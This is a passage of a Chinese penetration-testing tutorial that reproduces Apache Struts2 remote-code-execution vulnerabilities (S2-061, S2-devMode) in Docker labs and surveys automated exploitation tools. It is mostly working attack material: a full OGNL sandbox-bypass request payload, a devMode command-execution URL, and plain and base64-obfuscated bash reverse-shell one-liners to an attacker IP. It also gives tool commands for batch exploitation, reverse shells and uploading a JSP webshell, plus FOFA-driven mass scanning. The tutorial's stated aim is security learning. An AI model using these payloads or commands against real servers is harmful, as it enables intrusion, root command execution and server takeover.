+    }
+    res1 = requests.post(url, data=data1)
+    # print(res1.text)
+    res2 = requests.post(url, data=data2)
+    # print(res2.text)
+    
+
+![1641220134_61d3082618630f2f36f85.png!small?1641220137175](https://image.3001.net/images/20220103/1641220134_61d3082618630f2f36f85.png!small?1641220137175)
+
+成功远程代码执行！
+
+### 20、S2-061远程执行代码漏洞
+
+#### 1）漏洞简介
+
+（1）漏洞原理：
+
+Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061
+Struts
+远程代码执行漏洞(CVE-2020-17530)，在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大。Struts2
+会对某些标签属性(比如`id`，其他属性有待寻找)
+的属性值进行二次表达式解析，因此当这些标签属性中使用了`%{x}`且`x`的值用户可控时，用户再传入一个`%{payload}`即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过。
+
+（2）影响版本：
+
+    
+    
+    Struts 2.0.0 - Struts 2.5.25
+    
+
+#### 2）漏洞启动
+
+（1）开启报错解决  
+![1641220141_61d3082d0b2492a03ec3e.png!small?1641220145336](https://image.3001.net/images/20220103/1641220141_61d3082d0b2492a03ec3e.png!small?1641220145336)
+
+    
+    
+    docker network ls | wc -l 查看network数量
+    docker network prune关闭未使用的网络
+    
+
+（2）开启struts2-001漏洞  
+![1641220145_61d30831a8f0741b43d19.png!small?1641220148541](https://image.3001.net/images/20220103/1641220145_61d30831a8f0741b43d19.png!small?1641220148541)
+
+    
+    
+    sudo docker-compose up -d
+    
+
+（3）验证是否开启  
+![1641220151_61d30837f0cbe37452e43.png!small?1641220153090](https://image.3001.net/images/20220103/1641220151_61d30837f0cbe37452e43.png!small?1641220153090)
+
+    
+    
+    sudo docker ps
+    
+
+#### 3）漏洞复现
+
+（1）访问靶机：
+
+![1641220156_61d3083ca264136cbd46b.png!small?1641220157039](https://image.3001.net/images/20220103/1641220156_61d3083ca264136cbd46b.png!small?1641220157039)
+
+    
+    
+    http://192.168.253.7:8080/index.action
+    
+
+（2）验证漏洞是否存在-POC-1：
+
+    
+    
+    POST /index.action HTTP/1.1
+    Host: 192.168.253.7:8080
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Accept-Language: en
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+    Connection: close
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
+    Content-Length: 827
+    
+    ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+    Content-Disposition: form-data; name="id"
+    
+    %{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
+    ------WebKitFormBoundaryl7d1B1aGsV2wcZwF--    
+
+![1641220164_61d30844dbe430f6955b9.png!small?1641220167433](https://image.3001.net/images/20220103/1641220164_61d30844dbe430f6955b9.png!small?1641220167433)
+
+成功远程代码执行！
+
+（3）POC-2-反弹shell：
+
+![1641220169_61d30849e996f5354b163.png!small?1641220170761](https://image.3001.net/images/20220103/1641220169_61d30849e996f5354b163.png!small?1641220170761)
+
+    
+    
+    bash -i >& /dev/tcp/192.168.253.27/8889 0>&1
+    
+    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1My4yNy84ODg5IDA+JjE=}|{base64,-d}|{bash,-i}
+    
+
+![1641220174_61d3084e99f054f38df11.png!small?1641220179362](https://image.3001.net/images/20220103/1641220174_61d3084e99f054f38df11.png!small?1641220179362)
+
+替换POC-1中的id位置即可！成功远程代码执行！
+
+### 21、S2-devMode远程执行代码漏洞
+
+#### 1）漏洞简介
+
+（1）漏洞原理：
+
+当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。如果WebService
+启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。
+
+（2）影响版本：
+
+    
+    
+    当Struts开启devMode时，该漏洞将影响Struts 2.1.0–2.5.1，通杀Struts2所有版本
+    
+
+#### 2）漏洞启动
+
+（1）拉取漏洞环境到本地  
+![1641220180_61d308548c4e239e170f9.png!small?1641220183151](https://image.3001.net/images/20220103/1641220180_61d308548c4e239e170f9.png!small?1641220183151)
+
+    
+    
+    docker pull medicean/vulapps:s_struts2_s2-devmode
+    
+
+（2）启动漏洞环境并验证  
+![1641220185_61d3085948237f3df0a3a.png!small?1641220186110](https://image.3001.net/images/20220103/1641220185_61d3085948237f3df0a3a.png!small?1641220186110)
+
+    
+    
+    sudo docker run -d -p 8888:8080 medicean/vulapps:s_struts2_s2-devmode
+    sudo docker ps
+    
+
+#### 3）漏洞复现
+
+（1）访问靶机：
+
+![1641220190_61d3085e8f5307824673f.png!small?1641220191195](https://image.3001.net/images/20220103/1641220190_61d3085e8f5307824673f.png!small?1641220191195)
+
+    
+    
+    http://192.168.253.7:8888/
+    
+
+（2）验证漏洞是否存在
+
+![1641220195_61d30863c46ab137e030d.png!small?1641220196975](https://image.3001.net/images/20220103/1641220195_61d30863c46ab137e030d.png!small?1641220196975)
+
+    
+    
+    /orders/new/?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=id
+    
+
+直接root权限获取！
+
+（3）k8工具远程代码执行  
+![1641220201_61d308693476629db67c2.png!small?1641220201666](https://image.3001.net/images/20220103/1641220201_61d308693476629db67c2.png!small?1641220201666)
+
+通过K8的工具也是可以直接root执行命令的！成功远程代码执行！
+
+## 三、自动化武器合集
+
+### 1、K8神器
+
+K8大佬的神器还是非常好用的！  
+![1641220217_61d30879a9f2fff41d11c.png!small?1641220218685](https://image.3001.net/images/20220103/1641220217_61d30879a9f2fff41d11c.png!small?1641220218685)
+
+### 2、安恒版Struts2-2018版
+
+安恒版本的RCE武器！  
+![1641220223_61d3087f935f732f6845f.png!small?1641220225298](https://image.3001.net/images/20220103/1641220223_61d3087f935f732f6845f.png!small?1641220225298)
+
+### 3、Struts2Scan
+
+Struts2漏洞利用扫描工具，基于互联网上已经公开的Structs2高危漏洞exp的扫描利用工具，目前支持的漏洞如下: S2-001, S2-003,
+S2-005, S2-007, S2-008, S2-009, S2-012, S2-013, S2-015, S2-016, S2-019,
+S2-029, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, S2-052, S2-053,
+S2-devMode, S2-057  
+支持单个URL漏洞检测和批量URL检测，至此指定漏洞利用，可获取WEB路径，执行命令，反弹shell和上传文件，注意，并不是所有的漏洞均支持上述功能，只有部分功能支持!
+
+    
+    
+    Usage: Struts2Scan.py [OPTIONS]
+    
+      Struts2批量扫描利用工具
+    
+    Options:
+      -i, --info          漏洞信息介绍
+      -v, --version       显示工具版本
+      -u, --url TEXT      URL地址
+      -n, --name TEXT     指定漏洞名称, 漏洞名称详见info
+      -f, --file TEXT     批量扫描URL文件, 一行一个URL
+      -d, --data TEXT     POST参数, 需要使用的payload使用{exp}填充, 如: name=test&passwd={exp}
+      -c, --encode TEXT   页面编码, 默认UTF-8编码
+      -p, --proxy TEXT    HTTP代理. 格式为http://ip:port
+      -t, --timeout TEXT  HTTP超时时间, 默认10s
+      -w, --workers TEXT  批量扫描进程数, 默认为10个进程
+      --header TEXT       HTTP请求头, 格式为: key1=value1&key2=value2
+      -e, --exec          进入命令执行shell
+      --webpath           获取WEB路径
+      -r, --reverse TEXT  反弹shell地址, 格式为ip:port
+      --upfile TEXT       需要上传的文件路径和名称
+      --uppath TEXT       上传的目录和名称, 如: /usr/local/tomcat/webapps/ROOT/shell.jsp
+      -q, --quiet         关闭打印不存在漏洞的输出，只保留存在漏洞的输出
+      -h, --help          Show this message and exit.
+    
+
+1）单个URL漏洞检测:
+
+    
+    
+    python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action
+    
+
+2）批量漏洞检测:
+
+    
+    
+    python3 Struts2Scan.py -f urls.txt
+    
+
+3）POST数据:
+
+    
+    
+    python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin&email=admin&age={exp}
+    
+
+4）指定漏洞名称利用:
+
+    
+    
+    # 命令执行
+    $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --exec
+    
+    # 反弹shll
+    $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --reverse 192.168.100.8:8888
+    
+    # 上传shell
+    $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --upfile shell.jsp --uppath /usr/local/tomcat/webapps/ROOT/shell.jsp
+    
+
+![1641220234_61d3088a741f9d05baa97.png!small?1641220235580](https://image.3001.net/images/20220103/1641220234_61d3088a741f9d05baa97.png!small?1641220235580)
+
+### 4、Struts-scan
+
+Struts scan也是非常好用的！  
+![1641220239_61d3088f8a4c767753053.png!small?1641220241930](https://image.3001.net/images/20220103/1641220239_61d3088f8a4c767753053.png!small?1641220241930)
+
+    
+    
+    struts-scan.exe http://192.168.253.7:8080/showcase.action
+    
+
+### 5、Struts2终极武器
+
+经典终极RCE struts武器！  
+![1641220245_61d3089548da7ac1146a1.png!small?1641220246026](https://image.3001.net/images/20220103/1641220245_61d3089548da7ac1146a1.png!small?1641220246026)
+
+### 6、Vulmap
+
+https://github.com/zhzyker/vulmap
+
+    
+    
+    # git 或前往 release 获取原码
+    git clone https://github.com/zhzyker/vulmap.git
+    # 安装所需的 python 依赖
+    pip3 install -r requirements.txt
+    # Linux & MacOS & Windows
+    python3 vulmap.py -u http://example.com
+    
+
+![1641220251_61d3089b6891571643b94.png!small?1641220258415](https://image.3001.net/images/20220103/1641220251_61d3089b6891571643b94.png!small?1641220258415)
+
+![1641220256_61d308a01703f658dfc14.png!small?1641220258416](https://image.3001.net/images/20220103/1641220256_61d308a01703f658dfc14.png!small?1641220258416)
+
+    
+    
+    # 测试所有漏洞 poc 不指定 -a all 将默认开启指纹识别
+    python3 vulmap.py -u http://example.com
+    
+    # 检查站点是否存在 struts2 漏洞
+    python3 vulmap.py -u http://example.com -a struts2
+    
+    # 对 http://example.com:7001 进行 WebLogic 的 CVE-2019-2729 漏洞利用
+    python3 vulmap.py -u http://example.com:7001 -v CVE-2019-2729
+    python3 vulmap.py -u http://example.com:7001 -m exp -v CVE-2019-2729
+    
+    # 批量扫描 list.txt 中的 url
+    python3 vulmap.py -f list.txt
+    
+    # 扫描结果导出到 result.json
+    python3 vulmap.py -u http://example.com:7001 --output-json result.json
+    
+    # 调用 fofa api 批量扫描
+    python3 vulmap.py --fofa app=Apache-Shiro
+    
+
+![1641220262_61d308a668a983a0bba5d.png!small?1641220263142](https://image.3001.net/images/20220103/1641220262_61d308a668a983a0bba5d.png!small?1641220263142)
+
+![1641220266_61d308aa16b3f3e737725.png!small?1641220268244](https://image.3001.net/images/20220103/1641220266_61d308aa16b3f3e737725.png!small?1641220268244)
+
+![1641220270_61d308ae7c0e2bae4b927.png!small?1641220273365](https://image.3001.net/images/20220103/1641220270_61d308ae7c0e2bae4b927.png!small?1641220273365)
+
+![1641220274_61d308b25f409eca405c7.png!small?1641220276234](https://image.3001.net/images/20220103/1641220274_61d308b25f409eca405c7.png!small?1641220276234)
+
+通过四张图，可以看到其用法和检测出很多不同的漏洞形态，也是非常的好用！
+
+## 四、总结
+
+今天学到认知Struts2-045至Struts2-061的全部远程代码执行攻击总结、实战武器Struts2的总结RCE使用经验等等操作，最后远程代码执行控制服务器等操作，学到了非常多的小技巧和干货，希望小伙伴能实际操作复现一遍！来巩固告知企业单位的漏洞情况，并尽快进行加固巩固安全！
+
+    
+    
+    服务攻防之数据库Mysql（上）-> 服务攻防之数据库Mysql（下）-> 服务攻防之数据库MSSQL（上）-> 服务攻防之数据库MSSQL（中）-> 服务攻防之数据库MSSQL（下）-> 服务攻防之数据库Oracle（上）-> 服务攻防之数据库Oracle（下）-> 服务攻防之数据库Redis（上）-> 服务攻防之数据库Redis（下）-> 服务攻防之数据库Mongodb（上）-> 服务攻防之数据库Mongodb（下）-> 服务攻防之中间件IIS（上）-> 服务攻防之中间件IIS（下）-> 服务攻防之中间件Apache（总）-> 服务攻防之中间件Nginx（总）-> 服务攻防之中间件Tomcat（上）-> 服务攻防之中间件Tomcat（下）-> 服务攻防之中间件JBoss（上）-> 服务攻防之中间件JBoss（中）-> 服务攻防之中间件JBoss（下）-> 服务攻防之中间件Weblogic（上）-> 服务攻防之中间件Weblogic（下）-> 服务攻防之中间件GlassFish（总）-> 服务攻防之中间件WebSphere（总）-> 服务攻防之框架Struts2（上）-> 服务攻防之框架Struts2（下）-> 服务攻防之框架Thinkphp（总）......
+    
+
+接下来在《服务攻防之框架Thinkphp（总）》会接触到Thinkphp简介、Thinkphp安装、Thinkphp任意代码执行分析、Thinkphp远程代码执行漏洞、Thinkphp自动化武器攻击等等渗透操作，如何提权渗透等方法，请看下篇服务攻防之框架Thinkphp篇总章！
+
+希望大家提高安全意识，没有网络安全就没有国家安全！
+
+今天基础牢固就到这里，虽然基础，但是必须牢记于心。
+
+作者：大余
+
